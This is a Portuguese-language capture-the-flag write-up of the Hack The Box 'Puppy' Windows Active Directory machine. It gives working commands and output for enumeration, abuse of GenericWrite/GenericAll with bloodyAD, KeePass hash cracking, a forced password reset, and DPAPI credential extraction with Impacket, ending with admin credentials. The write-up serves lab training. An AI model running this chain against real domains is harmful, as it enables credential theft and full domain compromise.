---
title: "Puppy - HTB"
date: 2025-10-27
summary: "As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!"
layout: "single"
tags: ["Windows", "Medium", "HTB"]
---

## Resumo

A Puppy é uma máquina de nível Medium focada em **Windows/Active Directory (AD)**. Apesar de ser nível Medium ela é uma máquina bastante simples e ótima para iniciantes. Nela abusamos de uma permissão de `GenericWrite` em um grupo do AD que nos garante acesso a uma share contendo um database do software KeePass. Brutando esse database conseguimos as senhas de vários usuários e um deles nos dá acesso a outra permissão de `GenericAll` em cima de outro usuário, permitindo assim mudar a senha dele e obter acesso remoto. Após obtermos acesso encontramos um arquivo de backup contendo a senha de outro usuário e por fim, obtemos acesso ao Administrator por meio do dump de DPAPI.


## User Flag

Como descrito na descrição da box, ja iniciamos com um usuário e senha: `levi.james / KingofAkron2025!`, usaremos ele para iniciar o recon e entender o que temos de disponivel para utilizar.

Estarei utilizando o [Rustscan](https://github.com/bee-san/RustScan) para realizar a enumeração inicial para encontrar portas abertas e o nome do AD/DOMAIN:

```bash
rustscan -a 10.10.11.70 -u 5000 -- -sV
```

Resultados:

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-18 03:29:03Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  status        syn-ack ttl 127 1 (RPC #100024)
3260/tcp  open  iscsi?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62647/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

{{< alert >}}
**SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo `/etc/hosts` para não ter problemas de DNS. E SEMPRE que for possível, coloque o `dc.DOMINIO.htb` ANTES do `DOMINIO.htb`.**
{{< /alert >}}

Vemos várias portas padrões e nada interessante de cara, então partirei para a enumeração das shares do SMB (Server Message Block). Para isso estarei utilizando o [NetExec](https://www.netexec.wiki/):

```bash
nxc smb PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --shares
```

Resultados:

```bash
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 

```

Notamos que a share `DEV` é uma share fora do padrão de máquinas Windows, então ficaremos de olho nisso, porém por hora não temos acesso a ela.

Agora o que resta é enumerar o AD completo, e para isso estarei usando o [bloodhound-python](https://github.com/dirkjanm/BloodHound.py):

```bash
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' --zip -c ALL -ns 10.10.11.70 -d PUPPY.HTB
```

Após o scan terminar, ele irá gerar um zip contendo todo o dump do AD, e com isso podemos "digerir" esse zip e gerar um gráfico para entender a estrutura do AD. Para isso estarei usando o [BloodHound-Legacy](https://github.com/SpecterOps/BloodHound-Legacy).

### Analises do AD

Nosso usuário faz parte de um grupo que possui a permissão `GenericWrite` para outro grupo chamado `DEVELOPERS`.

![analise1](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692305/image1_avqcdn.png)

Como vimos anteriormente, existe uma share chamada DEV que é especifica do grupo `DEVELOPERS`.


Continuando a análise do AD, vimos que o usuário **ADAM.SILVER** possui a permissão de `PSREMOTE`, o que torna interessante adquirir o acesso dele, e um meio de chegar até ele é através do **ANT.EDWARDS**: 

![analise2](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692306/image3_kdbhov.png)

Vimos também outro usuário com a permissão `PSREMOTE`, o que também o torna interessante:

![analise3](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692306/image4_lnqlii.png)


### Atacando o AD

Para iniciar o ataque, estarei abusando da permissão [`GenericAll`](https://www.thehacker.recipes/ad/movement/dacl/addmember) que permite nós nos adicionarmos no grupo `DEVELOPERS` para assim, termos acesso à share `DEV`. Estarei utilizando o [BloodyAD](https://github.com/CravateRouge/bloodyAD) para esse ataque. Caso você queira realizar outras funções do bloodyAD e não tem saco para ler o help da ferramenta, te aconselho esse [site](https://seriotonctf.github.io/BloodyAD-Cheatsheet/). 


Para nos adicionarmos no grupo, usarei o seguinte comando:

```bash
bloodyAD --host puppy.htb -u levi.james -p 'KingofAkron2025!' -d puppy.htb bloody add groupMember DEVELOPERS levi.james
```

Resultados:

```bash
[+] levi.james added to DEVELOPERS
```

Com isso ganhamos permissão de acesso na share DEV. Acessando a share com o [smbclient-ng](https://github.com/p0dalirius/smbclient-ng) nos deparamos com o seguinte arquivo:

```bash
smbclient-ng -d "puppy.htb" -u "levi.james" -p 'KingofAkron2025!' --host "puppy.htb"
```

![attack1](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692307/image6_lt0dcb.png)


Buscando na web o que é um arquivo kdbx, vemos que:

> Um arquivo .kdbx é um banco de dados de senhas criptografado, criado e usado pelo gerenciador de senhas de código aberto, o KeePass. Ele armazena senhas e outras informações de login de forma segura, sendo acessível apenas com uma senha mestra.

Então, basta descobrirmos a senha usada para criptografar o database que conseguimos acesso a tudo dentro dele. Tendo isso em mente, estarei usando o [keepass2john](https://github.com/ivanmrsulja/keepass2john) para geramos a hash para enfim, tentar o ataque de brute-force:

```bash
keepass2john recovery.kdbx > hash
```

Resultado:

```bash 
recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
```

Utilizando o john para quebrar:

```bash
john --wordlist="/usr/share/wordlists/rockyou.txt" hash
```

Recebemos a seguinte senha:

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 128/128 SSE2])
Cost 1 (t (rounds)) is 37 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 4 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
**liverpool        (recovery)**     
1g 0:00:00:32 DONE (2025-05-18 01:13) 0.03088g/s 1.112p/s 1.112c/s 1.112C/s purple..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

#### Obtendo o usuário ANT.EDWARDS

Utilizando a ferramenta [kpcli](https://github.com/rebkwok/kpcli) e a senha adquirida, conseguimos dumpar os dados do arquivo:

{{< alert >}}
**Para essa ferramenta rodar corretamente, é preciso exportar o arquivo do database para ele conseguir "encontrar" ele. Para fazer isso só é preciso adicionar `KEEPASSDB=recovery.kdbx` antes do comando da ferramenta.**
{{< /alert >}}

```bash
> KEEPASSDB=recovery.kdbx kpcli ls                             

Database: recovery.kdbx
UNLOCKING...

Database password: 
================================================================================
Groups
================================================================================
Root

```

```bash
> KEEPASSDB=recovery.kdbx kpcli ls --group Root --entries 

Database: recovery.kdbx
UNLOCKING...

Database password: 
================================================================================
Root
================================================================================
ADAM SILVER
ANTONY C. EDWARDS
JAMIE WILLIAMSON
SAMUEL BLAKE
STEVE TUCKER

```

Utilizando a função `cp`, a senha é copiada para o clipboard:

```bash
> KEEPASSDB=recovery.kdbx kpcli cp Root/'ANTONY C. EDWARDS' password
```

Com isso, conseguimos a senha do **ANT.EDWARDS: Antman2025!**

#### Obtendo o usuário ADAM.SILVER

Como vimos anteriormente, o usuário **ANT.EDWARDS** possui `GenericAll` sobre o user **ADAM.SILVER**. Podemos abusar disso e alterar a senha do ADAM. Novamente estarei usando o BloodyAD:

```bash
bloodyAD --host puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'Password123!'
```

Porém, se analisarmos o node do **ADAM.SILVER**, vemos que esse usuário está desabilitado:

![adam](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692309/image8_xw4opo.png)

Para habilitar ele, irei usar novamente o bloodyAD:

```bash
bloodyAD --host puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
```

Resultado:

```bash
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

E por fim, conseguimos logar no PowerShell com o usuário ADAM.SILVER utilizando o [Evil-Winrm](https://github.com/Hackplayers/evil-winrm):

![evilwinrm](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692309/image9_hiivsv.png)

## Root Flag

### Obtendo o usuário STEPH.COOPER

Explorando os arquivos da máquina, encontramos um arquivo de backup na pasta `C:\Backups`:

![root1](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692311/image10_nu2qza.png)

Baixando o arquivo, extraindo e analisando ele, encontramos a senha do usuário **STEPH.COOPER**:

![root2](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692311/image11_nfan3q.png)

Com isso podemos logar no usuário **STEPH.COOPER** usando o Evil-Winrm:

![root3](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692312/image12_ga3e76.png)

### Obtendo o usuário Administrator

Analisando as pastas do STEPH.COOPER, encontramos um arquivo `.lnk` do Microsoft Edge na Desktop dele:

![root4](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761692313/image13_t7jkwd.png)

Isso não é muito normal em CTFs Windows, normalmente quanto existe um arquivo `.lnk` em uma máquina de CTF, significa que um browser foi utilizado por esse usuário. 

Seguindo o post do The Hackers Recipe a respeito de [DPAPI secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#dpapi-secrets), podemos extrair as senhas salvas utilizando o **DPAPI (Data Protection API)**, que é um componente interno nos sistemas Windows.

O **DPAPI** permite que aplicações armazenem dados sensíveis. Esses dados são armazenados nos diretórios dos usuários e são guardadas por chaves mestras especificas do usuário, derivadas da senha deles. Para decriptografar esses dados, precisamos da senha do usuário e da master key.

A master key criptografada se encontra no diretório:

```bash
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Alguns diretórios que contém dados escondidos protegidos pelo DPAPI são:

```bash
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

Para dumpar a master key criptografada, precisaremos baixar na nossa máquina. Para facilitar irei passar em base64 e decodar no meu terminal (OBS: não podemos baixar diretamente o arquivo pois não temos permissão)

```bash
[Convert]::ToBase64String((Get-Content -Path "C:/Users/steph.cooper/AppData/Roaming/Microsoft/Protect/S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407" -Encoding byte))
```

Agora decodamos na nossa máquina e salvamos em um arquivo:

```bash
echo "AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=" | base64 -d > masterkey
```

Agora pegamos o dado criptografado do mesmo jeito:

```bash
[Convert]::ToBase64String((Get-Content -Path "C:/Users/steph.cooper/AppData/Roaming/Microsoft/Credentials/C8D69EBE9A43E9DEBF6B5FBD48B521B9" -Encoding byte))
```

```bash
echo "AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYPSiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc" | base64 -d > data
```

Para decriptar a chave mestra, podemos utilizar o [dpapi.py do Impacket](https://github.com/fortra/impacket):

```bash
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD
```

OBS: o SID é o ID que estava no nome da pasta onde estava armazenada a master key, nesse caso é “S-1-5-21-1487982659-1829050783-2281216199-1107”. E o password é a senha do usuário.

```bash
dpapi.py masterkey -file "masterkey" -sid "S-1-5-21-1487982659-1829050783-2281216199-1107" -password 'ChefSteph2025!'
```

Resultado:

```bash
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Usando a chave descriptografada, podemos usar ela para descriptografar o dado obtido anteriormente:

```bash
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```

```bash
dpapi.py credential -file data -key "0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84"
```

Resultado:

```bash
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Com isso adquirimos a senha do admin local. Podemos logar e pegar a root.txt.